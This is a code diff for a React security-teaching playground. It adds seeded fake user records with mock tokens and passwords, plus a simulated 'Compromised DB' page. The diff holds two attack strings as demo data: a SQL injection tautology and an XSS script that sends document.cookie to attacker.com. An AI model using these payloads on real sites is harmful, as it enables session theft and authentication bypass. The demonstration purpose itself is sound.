@@ -1,11 +1,15 @@
 import React, { useState } from 'react';
-import { FormSubmission, PlaygroundPage } from './types';
+import { FormSubmission, PlaygroundPage, BreachIncident } from './types';
 import GoogleFormView from './components/GoogleFormView';
 import SecurityVisualizer from './components/SecurityVisualizer';
+import CompromisedDatabaseView from './components/CompromisedDatabaseView';
 import { 
   FileText, 
   Shield, 
   Columns, 
+  Database,
+  AlertTriangle,
+  Lock,
   Sparkles, 
   Zap, 
   ArrowRight, 
@@ -14,6 +18,23 @@ import {
 } from 'lucide-react';
 
 const INITIAL_SUBMISSIONS: FormSubmission[] = [
+  {
+    id: 'sub_seed_admin',
+    name: 'Eleanor Vance (SysAdmin)',
+    email: 'eleanor.admin@securecorp.net',
+    feedback: 'Critical database maintenance completed. Root API keys rotated.',
+    environment: 'Production (Strict Parameterized Queries)',
+    rating: 5,
+    submittedAt: '09:14:02 AM',
+    hasSQLi: false,
+    hasXSS: false,
+    role: 'Root Administrator',
+    sessionToken: 'sess_live_root_99x81a_sec',
+    passwordHash: '$2b$12$e9K2vL09mH.78xYzQ1pWue9',
+    plainPasswordSimulated: 'AdminSuperPass#2026!',
+    ipAddress: '10.0.0.1 (Internal Gateway)',
+    accountBalance: '$95,420.00',
+  },
   {
     id: 'sub_seed_1',
     name: 'Alex Mercer',
@@ -24,17 +45,46 @@ const INITIAL_SUBMISSIONS: FormSubmission[] = [
     submittedAt: '10:45:12 AM',
     hasSQLi: false,
     hasXSS: false,
+    role: 'Staff Engineer',
+    sessionToken: 'sess_live_alex_44f80c_jwt',
+    passwordHash: '$2b$12$w3J9kM12bC.45vXyZ9pQae1',
+    plainPasswordSimulated: 'MercerWinter#2026!',
+    ipAddress: '192.168.1.104',
+    accountBalance: '$14,200.00',
+  },
+  {
+    id: 'sub_seed_fin',
+    name: 'Marcus Sterling',
+    email: 'marcus.fin@investcorp.com',
+    feedback: 'Submitted Q3 payroll budget spreadsheet. Awaiting disbursement approval.',
+    environment: 'Production (Strict Parameterized Queries)',
+    rating: 4,
+    submittedAt: '10:46:55 AM',
+    hasSQLi: false,
+    hasXSS: false,
+    role: 'VP Financial Operations',
+    sessionToken: 'sess_live_fin_88a91c_vip',
+    passwordHash: '$2b$12$z8K1vP99mQ.22wXyB3tVue7',
+    plainPasswordSimulated: 'SterlingCapital$99',
+    ipAddress: '172.16.4.22',
+    accountBalance: '$1,250,000.00',
   },
   {
     id: 'sub_seed_2',
     name: 'Attacker_SQLi',
     email: "' OR '1'='1",
-    feedback: 'Testing authentication bypass via unescaped WHERE clause.',
+    feedback: 'Testing authentication bypass via unescaped WHERE clause string concatenation.',
     environment: 'Legacy Staging (Vulnerable String Concatenation)',
     rating: 1,
     submittedAt: '10:48:30 AM',
     hasSQLi: true,
     hasXSS: false,
+    role: 'External Pentester',
+    sessionToken: 'sess_anon_sqli_prober_01',
+    passwordHash: '$2b$12$hacked0000000000000000',
+    plainPasswordSimulated: 'PayloadTest#1',
+    ipAddress: '45.33.32.156',
+    accountBalance: '$0.00',
   },
   {
     id: 'sub_seed_3',
@@ -46,6 +96,12 @@ const INITIAL_SUBMISSIONS: FormSubmission[] = [
     submittedAt: '10:52:05 AM',
     hasSQLi: false,
     hasXSS: true,
+    role: 'Security Auditor',
+    sessionToken: 'sess_anon_xss_runner_02',
+    passwordHash: '$2b$12$scriptInjection99999',
+    plainPasswordSimulated: 'ScriptAudit!99',
+    ipAddress: '198.51.100.77',
+    accountBalance: '$50.00',
   },
 ];
 
@@ -57,11 +113,27 @@ export default function App() {
   );
   const [toastMessage, setToastMessage] = useState<string | null>(null);
 
+  // Security breach & exfiltration tracking for Page 3
+  const [breachHistory, setBreachHistory] = useState<BreachIncident[]>([]);
+  const [latestBreach, setLatestBreach] = useState<BreachIncident | null>(null);
+
   const showToast = (msg: string) => {
     setToastMessage(msg);
     setTimeout(() => {
       setToastMessage(null);
     }, 4000);
+  };
+
+  const handleBreachDetected = (breach: BreachIncident) => {
+    setLatestBreach(breach);
+    setBreachHistory((prev) => [breach, ...prev]);
+    showToast(`🚨 ATTACK DETECTED: Data breach recorded! Page 3 unlocked.`);
+  };
+
+  const handleResetBreach = () => {
+    setLatestBreach(null);
+    setBreachHistory([]);
+    showToast('🛡️ Database secured: Compromised records purged.');
   };
 
   const handleFormSubmit = (newSubmission: FormSubmission) => {
@@ -88,11 +160,11 @@ export default function App() {
             <div className="flex items-center gap-2">
               <span className="text-xl">⚡</span>
               <span className="font-bold text-sm tracking-wide text-white">
-                Dual-Page Security Playground
+                Kalpvuksh 2.0 Security Playground
               </span>
             </div>
             <span className="hidden md:inline text-xs text-[#9ca3af] border-l border-[#1e2235] pl-3">
-              Google Form ↔ T018 Vulnerability Visualizer
+              Google Form ↔ Security Visualizer ↔ Database Vault
             </span>
           </div>
 
@@ -122,6 +194,28 @@ export default function App() {
             >
               <Shield className="w-3.5 h-3.5" />
               <span>Page 2: Security Visualizer</span>
+            </button>
+
+            <button
+              id="nav-page-exfiltrated"
+              onClick={() => setCurrentPage('exfiltrated')}
+              className={`flex items-center gap-2 px-3.5 py-1.5 rounded-lg font-medium transition-all cursor-pointer ${
+                currentPage === 'exfiltrated'
+                  ? 'bg-rose-600 text-white shadow-sm'
+                  : latestBreach
+                  ? 'text-rose-400 hover:text-rose-200 bg-rose-950/40 border border-rose-500/50 animate-pulse'
+                  : 'text-[#9ca3af] hover:text-white'
+              }`}
+            >
+              <Database className={`w-3.5 h-3.5 ${latestBreach ? 'text-rose-400' : 'text-gray-400'}`} />
+              <span>Page 3: Compromised DB</span>
+              {latestBreach ? (
+                <span className="bg-rose-500 text-white font-mono text-[9px] px-1.5 py-0.2 rounded font-bold uppercase">
+                  Breach!
+                </span>
+              ) : (
+                <Lock className="w-3 h-3 text-gray-500" />
+              )}
             </button>
 
             <button
@@ -164,6 +258,9 @@ export default function App() {
             <GoogleFormView
               onSubmitToVisualizer={handleFormSubmit}
               onSwitchToVisualizer={() => setCurrentPage('visualizer')}
+              onSwitchToExfiltrated={() => setCurrentPage('exfiltrated')}
+              onBreachDetected={handleBreachDetected}
+              hasBreachOccurred={!!latestBreach}
               submissions={submissions}
             />
           </div>
@@ -178,7 +275,43 @@ export default function App() {
                 comment: activeSubmission?.feedback || 'Great application platform!',
               }}
               latestFormSubmission={activeSubmission}
+              submissions={submissions}
+              hasBreachOccurred={!!latestBreach}
               onNavigateToForm={() => setCurrentPage('form')}
+              onNavigateToExfiltrated={() => setCurrentPage('exfiltrated')}
+              onBreachDetected={handleBreachDetected}
+            />
+          </div>
+        )}
+
+        {currentPage === 'exfiltrated' && (
+          <div className="w-full">
+            <CompromisedDatabaseView
+              latestBreach={latestBreach}
+              breachHistory={breachHistory}
+              submissions={submissions}
+              onNavigateToForm={() => setCurrentPage('form')}
+              onNavigateToVisualizer={() => setCurrentPage('visualizer')}
+              onSimulateAttack={(type) => {
+                const isSQLi = type === 'sqli';
+                const demoBreach: BreachIncident = {
+                  id: `breach_sim_${type}_${Date.now()}`,
+                  timestamp: new Date().toLocaleTimeString(),
+                  attackType: type,
+                  payload: isSQLi
+                    ? { email: "' OR '1'='1", comment: 'Auth bypass injection' }
+                    : { email: 'victim@securecorp.net', comment: '<script>fetch("http://attacker.com/steal?c=" + document.cookie)</script>' },
+                  title: isSQLi
+                    ? 'Simulated SQL Injection Database Dump'
+                    : 'Simulated XSS Session Exfiltration',
+                  summary: isSQLi
+                    ? "Tautological condition evaluated true. The raw query returned all private database rows."
+                    : "Script injected into client execution context. Active session cookies and auth tokens dumped.",
+                  subCategory: isSQLi ? 'Auth Bypass' : 'Session Hijacking',
+                };
+                handleBreachDetected(demoBreach);
+              }}
+              onResetBreach={handleResetBreach}
             />
           </div>
         )}
@@ -196,6 +329,9 @@ export default function App() {
               <GoogleFormView
                 onSubmitToVisualizer={handleFormSubmit}
                 onSwitchToVisualizer={() => setCurrentPage('visualizer')}
+                onSwitchToExfiltrated={() => setCurrentPage('exfiltrated')}
+                onBreachDetected={handleBreachDetected}
+                hasBreachOccurred={!!latestBreach}
                 submissions={submissions}
               />
             </div>
@@ -215,7 +351,11 @@ export default function App() {
                   comment: activeSubmission?.feedback || 'Great application platform!',
                 }}
                 latestFormSubmission={activeSubmission}
+                submissions={submissions}
+                hasBreachOccurred={!!latestBreach}
                 onNavigateToForm={() => setCurrentPage('form')}
+                onNavigateToExfiltrated={() => setCurrentPage('exfiltrated')}
+                onBreachDetected={handleBreachDetected}
               />
             </div>
           </div>
